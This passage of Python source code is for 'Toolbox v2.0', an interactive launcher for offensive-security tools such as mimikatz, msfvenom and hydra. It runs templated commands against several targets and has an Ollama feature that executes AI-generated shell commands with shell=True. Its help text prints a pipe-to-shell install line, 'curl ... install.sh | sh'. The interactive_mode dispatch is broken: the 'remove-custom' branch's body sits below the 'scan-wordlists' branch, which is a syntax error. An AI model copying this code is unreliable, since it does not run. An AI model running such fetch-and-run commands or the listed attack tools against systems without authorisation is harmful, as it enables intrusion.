            while True:
                choice = input(f"\nSelect command (1-{len(tool_info['commands'])}) or 'q' to quit: ").strip()
                if choice.lower() == 'q':
                    return
                elif choice.isdigit() and 1 <= int(choice) <= len(tool_info["commands"]):
                    selected_cmd = tool_info["commands"][int(choice) - 1]["command"]
                    
                    # Multi-target execution
                    if len(targets) > 1:
                        print(f"\n[+] Executing on {len(targets)} targets...")
                        for idx, tgt in enumerate(targets, 1):
                            print(f"\n[{idx}/{len(targets)}] Target: {tgt}")
                            formatted_cmd = selected_cmd.format(target=tgt, wordlist=wordlist, local_ip=local_ip)
                            
                            execute = input(f"Execute? (y/n/s=skip remaining): ").strip().lower()
                            if execute == 's':
                                break
                            elif execute == 'y':
                                self.run_command(formatted_cmd, tool_name, tgt)
                    else:
                        formatted_cmd = selected_cmd.format(target=target, wordlist=wordlist, local_ip=local_ip)
                        
                        print(f"\nCommand: {formatted_cmd}")
                        action = input(f"Execute? (y/n/e=edit/f=favorites/t=template): ").strip().lower()
                        
                        if action == 'e':
                            # Edit mode - allow user to modify the command
                            print(f"\n[+] Edit mode - Command is pre-filled, modify as needed:")
                            edited_cmd = self.input_with_prefill("Command: ", formatted_cmd).strip()
                            
                            if edited_cmd and edited_cmd != formatted_cmd:
                                formatted_cmd = edited_cmd
                                print(f"\n[+] Updated command: {formatted_cmd}")
                                confirm = input(f"Execute edited command? (y/n/f=favorites/t=template): ").strip().lower()
                                
                                if confirm == 'y':
                                    self.run_command(formatted_cmd, tool_name, target)
                                elif confirm == 'f':
                                    name = input("Favorite name (optional): ").strip()
                                    self.add_to_favorites(tool_name, formatted_cmd, name)
                                elif confirm == 't':
                                    template_name = input("Template name: ").strip()
                                    if template_name:
                                        self.save_template(template_name, formatted_cmd, f"{tool_name} custom template")
                            elif edited_cmd == formatted_cmd:
                                # No changes, ask if they want to execute original
                                confirm = input(f"\nNo changes made. Execute original? (y/n): ").strip().lower()
                                if confirm == 'y':
                                    self.run_command(formatted_cmd, tool_name, target)
                            else:
                                print("[!] Command cancelled.")
                        elif action == 'y':
                            self.run_command(formatted_cmd, tool_name, target)
                            
                            # Ask if user wants to continue
                            while True:
                                next_action = input("\n[?] Next action? (r=run another/s=save as/q=quit): ").strip().lower()
                                if next_action == 'q':
                                    return
                                elif next_action == 's':
                                    if self.last_output_file:
                                        custom_name = input("Save output as (e.g., output.txt): ").strip()
                                        if custom_name:
                                            import shutil
                                            dest = Path(custom_name) if '/' in custom_name else Path.cwd() / custom_name
                                            shutil.copy(self.last_output_file, dest)
                                            print(f"[+] Output saved to: {dest}")
                                    else:
                                        print("[!] No output to save")
                                elif next_action == 'r':
                                    break  # Break inner loop, continue outer loop
                                else:
                                    print("[!] Invalid option. Use r/s/q")
                        elif action == 'f':
                            name = input("Favorite name (optional): ").strip()
                            self.add_to_favorites(tool_name, formatted_cmd, name)
                        elif action == 't':
                            template_name = input("Template name: ").strip()
                            if template_name:
                                self.save_template(template_name, formatted_cmd, f"{tool_name} template")
                    
                    # Don't break - continue looping for more commands
                else:
                    print("[!] Invalid selection. Please try again.")
        
        except KeyboardInterrupt:
            print("\n\n[!] Operation cancelled by user.")
            return
        except EOFError:
            print("\n\n[!] Input terminated.")
            return
    
    def search_by_functionality(self, query):
        """Search tools by functionality"""
        query = query.lower()
        results = []
        
        for tool_name, tool_info in self.tools_db.items():
            if query in tool_name or query in tool_info["description"].lower():
                results.append(tool_name)
        
        return results
    
    def show_banner(self):
        """Display Toolbox banner"""
        try:
            config = json.loads(self.config_file.read_text())
            if not config.get("show_banner", True):
                return
        except:
            pass
        
        banner = r"""
╔════════════════════════════════════════════════════════════════════════════╗
║                                                                            ║
║   ████████╗ ██████╗  ██████╗ ██╗     ██████╗  ██████╗ ██╗  ██╗          ║
║   ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔══██╗██╔═══██╗╚██╗██╔╝          ║
║      ██║   ██║   ██║██║   ██║██║     ██████╔╝██║   ██║ ╚███╔╝           ║
║      ██║   ██║   ██║██║   ██║██║     ██╔══██╗██║   ██║ ██╔██╗           ║
║      ██║   ╚██████╔╝╚██████╔╝███████╗██████╔╝╚██████╔╝██╔╝ ██╗          ║
║      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝          ║
║                                                                            ║
║              Professional Cybersecurity Command Assistant                  ║
║                          Version 2.0                                       ║
╚════════════════════════════════════════════════════════════════════════════╝
"""
        print(banner)
        print("\033[1;36m[*] Over 100+ Security Tools at Your Fingertips\033[0m")
        print("\033[1;32m[*] Command History | Favorites | Workflows | Templates\033[0m")
        print("\033[1;33m[*] Multi-Target Support | Output Management | API Interface\033[0m")
        print("\033[1;35m[*] Hollywood Hacker Mode Included (Just For Fun!)\033[0m")
        print("\033[1;37m[*] Type 'help' for commands | 'q' to quit\033[0m")
        print()
    
    def list_all_tools(self):
        """List all available tools"""
        print("\n[+] Available tools:")
        categories = {
            "Reconnaissance & Scanning": ["nmap", "rustscan", "masscan", "whois", "dig", "nslookup"],
            "Web Application Testing": ["nikto", "wpscan", "sqlmap", "nuclei", "burpsuite", "zaproxy", "commix", "jwt_tool"],
            "Directory & Content Discovery": ["gobuster", "dirb", "ffuf", "feroxbuster", "wfuzz"],
            "Network & Enumeration": ["enum4linux", "smbmap", "crackmapexec"],
            "Credential Testing": ["hydra", "medusa", "john", "hashcat"],
            "Vulnerability Assessment": ["openvas"],
            "SSL/TLS & Encryption": ["sslscan", "testssl.sh", "openssl"],
            "Cryptography & Encoding": ["gpg", "hash-identifier", "base64", "steghide", "stegcracker", "exiftool", "cyberchef", "xortool", "rsactftool"],
            "Wireless Security": ["aircrack-ng"],
            "Reverse Engineering & Binary": ["binwalk", "strings", "objdump", "radare2", "gdb", "ltrace", "strace", "ghidra", "peda", "checksec", "readelf", "pwntools", "ropper", "one_gadget"],
            "Exploitation & Post-Exploitation": ["msfconsole", "searchsploit", "mimikatz", "weevely"],
            "Social Engineering": ["setoolkit"],
            "OSINT": ["theHarvester", "spiderfoot", "hakrawler"],
            "Fuzzing & Testing": ["radamsa", "cewl"],
            "DNS & Network Tools": ["dnsrecon", "dnsenum"],
            "Post-Exploitation & Lateral Movement": ["pwncat", "chisel"],
            "Firewall & IDS/IPS Evasion": ["msfvenom"],
            "Network Utilities": ["netcat", "curl", "wget", "find"],
            "Privilege Escalation": ["linpeas", "winpeas", "linenum", "linux-smart-enumeration", "pspy", "sudo_killer"],
            "Forensics & Data Recovery": ["volatility", "autopsy", "foremost", "scalpel", "bulk_extractor", "ddrescue", "photorec", "testdisk"],
            "Subdomain & API Enumeration": ["sublist3r", "subfinder", "assetfinder", "amass", "arjun", "httpx", "waybackurls", "gau"],
            "XSS & Injection Testing": ["dalfox", "xsser"],
            "File Sharing & Web Server": ["http.server"],
            "Hollywood Hacker & Fun Simulations": ["cmatrix", "hollywood", "cowsay", "figlet", "lolcat", "sl"]
        }
        
        for category, tools in categories.items():
            print(f"\n{category}:")
            for tool in tools:
                if tool in self.tools_db:
                    print(f"  - {tool}: {self.tools_db[tool]['description']}")
    
    def interactive_mode(self):
        """Run the tool in interactive mode"""
        self.show_banner()
        
        try:
            while True:
                try:
                    choice = input("\ntoolbox> ").strip().lower()
                except EOFError:
                    print("\n[+] Exiting...")
                    break
                
                if choice == 'q' or choice == 'quit' or choice == 'exit':
                    print("[+] Exiting...")
                    break
                elif choice == 'help':
                    print("\n[+] Available commands:")
                    print("  help              - Show this help message")
                    print("  list              - List all available tools")
                    print("  search <query>    - Search tools by functionality")
                    print("  use <tool>        - Interact with a specific tool")
                    print("  history [n]       - Show command history (last n commands)")
                    print("  favorites         - Show favorite commands")
                    print("  templates         - Show saved templates")
                    print("  workflows         - Show saved workflows")
                    print("  doctor            - Check tool availability")
                    print("  config            - Show configuration")
                    
                    # Custom commands
                    print("\n[+] Custom Commands:")
                    print("  add-custom        - Add your own custom command")
                    print("  list-custom       - List your custom commands")
                    print("  remove-custom     - Remove a custom command")
                    
                    # Wordlist commands
                    print("\n[+] Wordlist Commands:")
                    print("  scan-wordlists    - Scan and display all available wordlists")
                    
                    # AI commands if available
                    if self.ai:
                        print("\n[+] AI Commands (Natural Language):")
                        print("  ai <request>      - Generate command from natural language")
                        print("  ai-status         - Check AI system status")
                        print("  ai-config         - Configure AI settings")
                        print("  ai-context        - Show current AI context")
                        print("  ai-clear          - Clear AI conversation context")
                        print("  ai-help           - Show AI setup instructions")
                    else:
                        print("\n[!] AI Features Disabled - Install Ollama to enable")
                        print("    Type 'ai-help' for setup instructions")
                    
                    print("\n  q/quit/exit       - Exit the tool")
                elif choice == 'list':
                    self.list_all_tools()
                elif choice.startswith('history'):
                    parts = choice.split()
                    limit = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 20
                    self.show_history(limit)
                elif choice == 'favorites':
                    self.show_favorites()
                elif choice == 'templates':
                    self.show_templates()
                elif choice == 'workflows':
                    self.show_workflows()
                elif choice == 'doctor':
                    self.check_tool_availability()
                elif choice == 'config':
                    self.show_config()
                elif choice.startswith('search '):
                    query = choice[7:].strip()
                    if not query:
                        print("[!] Please provide a search query")
                        continue
                    
                    results = self.search_by_functionality(query)
                    if results:
                        print(f"\n[+] Tools matching '{query}':")
                        for tool in results:
                            print(f"  - {tool}: {self.tools_db[tool]['description']}")
                    else:
                        print(f"[!] No tools found matching '{query}'")
                elif choice.startswith('use '):
                    tool_name = choice[4:].strip()
                    if not tool_name:
                        print("[!] Please provide a tool name")
                        continue
                    
                    self.interact_with_tool(tool_name)
                
                # AI Commands
                elif choice.startswith('ai '):
                    self.handle_ai_command(choice[3:].strip())
                elif choice == 'ai-status':
                    self.show_ai_status()
                elif choice == 'ai-config':
                    self.configure_ai()
                elif choice == 'ai-context':
                    self.show_ai_context()
                elif choice == 'ai-clear':
                    self.clear_ai_context()
                elif choice == 'ai-help':
                    self.show_ai_help()
                
                # Custom Commands
                elif choice == 'add-custom':
                    self.add_custom_command()
                elif choice == 'list-custom':
                    self.list_custom_commands()
                elif choice.startswith('remove-custom'):
                # Wordlist Commands
                elif choice == 'scan-wordlists':
                    self.scan_wordlists()
                
                    parts = choice.split(maxsplit=1)
                    name = parts[1] if len(parts) > 1 else None
                    self.remove_custom_command(name)
                
                else:
                    # Try to interpret as a direct tool name
                    if choice in self.tools_db:
                        self.interact_with_tool(choice)
                    else:
                        print(f"[!] Unknown command: {choice}")
                        print("[!] Type 'help' for available commands")
        
        except KeyboardInterrupt:
            print("\n\n[+] Goodbye!")
            sys.exit(0)
    
    # ==================== AI Methods ====================
    
    def handle_ai_command(self, request: str):
        """Handle AI natural language command generation"""
        if not self.ai:
            print("\n[!] AI features are not available.")
            print("[!] Please install Ollama and the required model.")
            print("[!] Type 'ai-help' for setup instructions.")
            return
        
        if not request:
            print("[!] Please provide a request. Example: ai scan example.com")
            return
        
        # Check if Ollama is running
        if not self.ai.is_ollama_available():
            print("\n[!] Ollama is not running.")
            print("[!] Start Ollama with: ollama serve")
            print("[!] Or check if it's already running in the background.")
            return
        
        # Check if model is available
        if not self.ai.is_model_available():
            print(f"\n[!] Model '{self.ai.model}' is not available.")
            print(f"[!] Download it with: ollama pull {self.ai.model}")
            available = self.ai.get_available_models()
            if available:
                print(f"\n[+] Available models: {', '.join(available)}")
                print(f"[+] Change model with 'ai-config'")
            return
        
        print(f"\n[AI] 🤖 Generating command...")
        print(f"[AI] Request: {request}")
        
        # Generate command
        success, result = self.ai.generate_command(request)
        
        if not success:
            print(f"\n[!] {result}")
            return
        
        command = result
        print(f"\n[AI] ✓ Generated: {command}")
        
        # Validate command safety
        is_safe, warning = AICommandValidator.is_safe(command)
        if not is_safe:
            print(f"\n{warning}")
            confirm = input("This command may be dangerous. Continue? (yes/no): ").strip().lower()
            if confirm != 'yes':
                print("[!] Command cancelled for safety.")
                return
        
        # Check if requires root
        if AICommandValidator.requires_root(command):
            print("\n[!] Note: This command may require root privileges (sudo)")
        
        # Ask for confirmation
        action = input("\nExecute? (y/n/e=edit/f=favorites): ").strip().lower()
        
        if action == 'e':
            # Edit mode
            edited_cmd = self.input_with_prefill("Command: ", command).strip()
            if edited_cmd:
                command = edited_cmd
                confirm = input(f"\nExecute edited command? (y/n/f=favorites): ").strip().lower()
                if confirm == 'y':
                    self._execute_ai_command(command)
                elif confirm == 'f':
                    name = input("Favorite name (optional): ").strip()
                    self.add_to_favorites("ai-generated", command, name)
                    print(f"[+] Added to favorites!")
        elif action == 'y':
            self._execute_ai_command(command)
        elif action == 'f':
            name = input("Favorite name (optional): ").strip()
            self.add_to_favorites("ai-generated", command, name)
            print(f"[+] Added to favorites!")
        else:
            print("[!] Command cancelled.")
    
    def _execute_ai_command(self, command: str):
        """Execute AI-generated command"""
        # Extract tool name from command
        tool_name = command.split()[0]
        
        # Run the command
        print(f"\n[+] Executing: {command}\n")
        print("=" * 80)
        
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=False,
                text=True
            )
            
            print("=" * 80)
            
            if result.returncode == 0:
                print(f"\n[+] Command completed successfully")
            else:
                print(f"\n[!] Command exited with code: {result.returncode}")
            
            # Add to history
            self.add_to_history(tool_name, command, self.ai.context.get('last_target', ''))
        
        except KeyboardInterrupt:
            print("\n\n[!] Command interrupted by user")
        except Exception as e:
            print(f"\n[!] Error executing command: {e}")
    
    def show_ai_status(self):
        """Show AI system status"""
        if not self.ai:
            print("\n[!] AI module not loaded")
            print("[!] Please ensure toolbox_ai.py is in the same directory")
            return
        
        print("\n╔═══════════════════════════════════════════════════════╗")
        print("║              AI System Status                         ║")
        print("╚═══════════════════════════════════════════════════════╝")
        
        # Check Ollama availability
        ollama_status = "✓ Running" if self.ai.is_ollama_available() else "✗ Not Running"
        print(f"\nOllama Server: {ollama_status}")
        
        if self.ai.is_ollama_available():
            # Check model availability
            model_status = "✓ Available" if self.ai.is_model_available() else "✗ Not Downloaded"
            print(f"Current Model: {self.ai.model} ({model_status})")
            
            # List available models
            available = self.ai.get_available_models()
            if available:
                print(f"\nInstalled Models:")
                for model in available:
                    current = " (current)" if model == self.ai.model else ""
                    print(f"  - {model}{current}")
            
            # Show context
            print(f"\n{self.ai.show_context()}")
            
            if self.ai.is_model_available():
                print("[✓] AI is ready to use!")
                print("\nTry: ai scan example.com for vulnerabilities")
            else:
                print(f"\n[!] Download model with: ollama pull {self.ai.model}")
        else:
            print("\n[!] Start Ollama with: ollama serve")
            print("[!] Or check if it's already running: ps aux | grep ollama")
    
    def configure_ai(self):
        """Configure AI settings"""
        if not self.ai:
            print("[!] AI module not available")
            return
        
        print("\n╔═══════════════════════════════════════════════════════╗")
        print("║              AI Configuration                         ║")
        print("╚═══════════════════════════════════════════════════════╝")
        
        print(f"\nCurrent model: {self.ai.model}")
        
        if self.ai.is_ollama_available():
            available = self.ai.get_available_models()
            if available:
                print(f"\nInstalled models:")
                for i, model in enumerate(available, 1):
                    current = " (current)" if model == self.ai.model else ""
                    print(f"  {i}. {model}{current}")
                
                choice = input("\nSelect model number or press Enter to keep current: ").strip()
                if choice.isdigit() and 1 <= int(choice) <= len(available):
                    new_model = available[int(choice) - 1]
                    self.ai.set_model(new_model)
                    print(f"[+] Model changed to: {new_model}")
                elif choice:
                    print("[!] Invalid selection")
            else:
                print("\n[!] No models installed")
                print("[!] Install a model with: ollama pull codellama")
        else:
            print("\n[!] Ollama is not running")
        
        print("\nRecommended models:")
        print("  - codellama:7b   (Fast, good for commands)")
        print("  - llama3         (More accurate)")
        print("  - phi            (Lightweight)")
    
    def show_ai_context(self):
        """Show current AI conversation context"""
        if not self.ai:
            print("[!] AI module not available")
            return
        
        print(self.ai.show_context())
        
        if self.ai.context.get('conversation_history'):
            print("\nRecent Conversations:")
            for i, entry in enumerate(self.ai.context['conversation_history'][-5:], 1):
                print(f"\n{i}. Request: {entry['request']}")
                print(f"   Command: {entry['command']}")
    
    def clear_ai_context(self):
        """Clear AI conversation context"""
        if not self.ai:
            print("[!] AI module not available")
            return
        
        self.ai.clear_context()
        print("[+] AI context cleared")
        print("[+] Starting fresh conversation")
    
    def show_ai_help(self):
        """Show AI setup instructions"""
        if self.ai:
            print(self.ai.install_instructions())
        else:
            # Fallback if AI module not loaded
            print("""
╔═══════════════════════════════════════════════════════════════╗
║              Ollama AI Setup Instructions                     ║
╚═══════════════════════════════════════════════════════════════╝

AI features require Ollama to be installed and running.

Installation Steps:
─────────────────────────────────────────────────────────────────

1. Install Ollama:
   curl -fsSL https://ollama.com/install.sh | sh

2. Start Ollama (if not auto-started):
   ollama serve

3. Download a model:
   ollama pull codellama

4. Test installation:
   ollama list

For more information: https://ollama.com/
""")
    
    # ==================== End AI Methods ====================
    
    def show_config(self):
        """Show current configuration"""
        try:
            config = json.loads(self.config_file.read_text())
            print("\n[+] Current configuration:")
            for key, value in config.items():
                print(f"  {key}: {value}")
            print(f"\n[+] Config directory: {self.config_dir}")
            print(f"[+] Output directory: {self.output_dir}")
        except Exception as e:
            print(f"[!] Error reading config: {e}")
    
    def run(self):
        """Main entry point"""
        parser = argparse.ArgumentParser(
            description="Toolbox v2.0 - Professional Cybersecurity Command Assistant",
            epilog="Examples:\n"
                   "  toolbox                          # Interactive mode\n"
                   "  toolbox nmap                     # Show nmap commands\n"
                   "  toolbox directorybrutforce       # Show directory bruteforce tools\n"
                   "  toolbox -c nmap --help           # Detailed nmap help\n"
                   "  toolbox --list                   # List all tools\n"
                   "  toolbox --history                # Show command history\n",
            formatter_class=argparse.RawDescriptionHelpFormatter
        )
        
        # Main arguments
        parser.add_argument("query", nargs="?", help="Tool name or category to search")
        parser.add_argument("-c", "--command", help="Show detailed help for specific tool")
        parser.add_argument("--tool", help="Directly interact with a specific tool")
        parser.add_argument("--search", help="Search tools by functionality")
        parser.add_argument("--list", action="store_true", help="List all available tools")
        
        # Feature arguments
        parser.add_argument("--history", action="store_true", help="Show command history")
        parser.add_argument("--favorites", action="store_true", help="Show favorite commands")
        parser.add_argument("--templates", action="store_true", help="Show saved templates")
        parser.add_argument("--workflows", action="store_true", help="Show saved workflows")
        parser.add_argument("--doctor", action="store_true", help="Check tool availability")
        parser.add_argument("--config", action="store_true", help="Show configuration")
        
        # Workflow management
        parser.add_argument("--create-workflow", metavar="NAME", help="Create a new workflow")
        parser.add_argument("--run-workflow", metavar="NAME", help="Run a workflow")
        parser.add_argument("--target", help="Target for workflow execution")
        
        # Template management
        parser.add_argument("--save-template", metavar="NAME", help="Save a command template")
        parser.add_argument("--template-cmd", metavar="COMMAND", help="Command for template")
        
        args = parser.parse_args()
        
        # Handle detailed tool help
        if args.command:
            self.show_tool_help(args.command)
            return
        
        # Handle feature commands
        if args.history:
            self.show_history()
            return
        
        if args.favorites:
            self.show_favorites()
            return
        
        if args.templates:
            self.show_templates()
            return
        
        if args.workflows:
            self.show_workflows()
            return
        
        if args.doctor:
            self.check_tool_availability()
            return
        
        if args.config:
            self.show_config()
            return
        
        # Workflow management
        if args.create_workflow:
            self.create_workflow(args.create_workflow)
            return
        
        if args.run_workflow:
            target = args.target or ""
            self.run_workflow(args.run_workflow, target)
            return
        
        # Template management
        if args.save_template and args.template_cmd:
            self.save_template(args.save_template, args.template_cmd)
            return
        
        # Handle direct tool interaction
        if args.tool:
            self.interact_with_tool(args.tool)
            return
        
        # Handle search
        if args.search:
            results = self.search_by_functionality(args.search)
            if results:
                print(f"\n[+] Tools matching '{args.search}':")
                for tool in results:
                    print(f"  - {tool}: {self.tools_db[tool]['description']}")
            else:
                print(f"[!] No tools found matching '{args.search}'")
            return
        
        # Handle list
        if args.list:
            self.list_all_tools()
            return
        
        # Handle query argument (tool name or category)
        if args.query:
            query = args.query.lower()
            
            # Check if it's a direct tool name
            if query in self.tools_db:
                self.show_tool_help(query)
                return
            
            # Check if it's a category
            results = self.search_by_category(query)
            if results["exact"] or results["partial"] or results["description"]:
                print(f"\n[+] Results for '{args.query}':")
                
                if results["exact"]:
                    print(f"\n[Category Match]")
                    for tool in results["exact"]:
                        if tool in self.tools_db:
                            print(f"  - {tool}: {self.tools_db[tool]['description']}")
                
                if results["partial"]:
                    print(f"\n[Related Categories]")
                    for tool in results["partial"][:10]:
                        if tool in self.tools_db:
                            print(f"  - {tool}: {self.tools_db[tool]['description']}")
                
                if results["description"]:
                    print(f"\n[Description Match]")
                    for tool in results["description"][:10]:
                        if tool in self.tools_db:
                            print(f"  - {tool}: {self.tools_db[tool]['description']}")
                
                print(f"\n[+] Use 'toolbox -c <tool> --help' for detailed help")
                return
            else:
                print(f"[!] No results found for '{args.query}'")
                print("[!] Try: toolbox --list to see all available tools")
                return
        
        # Default: interactive mode
        self.interactive_mode()

if __name__ == "__main__":
    try:
        cli = Toolbox()
        cli.run()
    except KeyboardInterrupt:
        print("\n\n[+] Operation cancelled. Goodbye!")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        sys.exit(1)